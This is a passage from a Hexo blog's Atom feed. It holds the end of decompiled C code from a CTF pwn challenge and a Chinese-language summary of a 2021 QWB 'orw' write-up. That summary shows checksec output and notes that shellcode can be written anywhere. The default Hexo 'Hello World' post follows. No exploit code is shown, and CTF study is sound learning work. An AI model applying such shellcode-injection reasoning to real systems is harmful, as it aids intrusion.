class="line">  buf[<span class="number">9</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1463(a1, a2, a3);</span><br><span class="line">  alarm(<span class="number">0x168</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">    sub_9292(&amp;s2, <span class="number">64LL</span>, buf);</span><br><span class="line">    v6 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt;= <span class="number">0x3F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(fd, buf, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( ((*__ctype_b_loc())[SLOBYTE(buf[<span class="number">0</span>])] &amp; <span class="number">0x1000</span>) != <span class="number">0</span> )</span><br><span class="line">        *((_BYTE *)s2 + v6++) = buf[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    ::fd = open(<span class="string">&quot;/dev/NULL&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    v5 = fcntl(<span class="number">0</span>, <span class="number">3</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;F_GETFL error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( fcntl(<span class="number">0</span>, <span class="number">4</span>, v5 | <span class="number">0x800</span>u) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;F_SETFL error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      sub_8BB9();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;参考链接：&lt;a href=&quot;https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/&quot;&gt;https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;强网先锋-orw&quot;&gt;&lt;a href=&quot;#强网先锋-orw&quot; class=&quot;headerlink&quot; title=&quot;[强网先锋]orw&quot;&gt;&lt;/a&gt;[强网先锋]orw&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;查看程序，基本全是7的权限，所以说shellcode往哪里写都可以：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;secc@ubuntu:~/Desktop$ checksec pwn&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[*] &amp;#x27;/home/secc/Desktop/pwn&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NX:       NX disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/10/09/hello-world/"/>
    <id>http://example.com/2021/10/09/hello-world/</id>
    <published>2021-10-08T16:34:51.073Z</published>
    <updated>1985-10-26T08:15:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/writing.html&quot;&gt;Writing&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
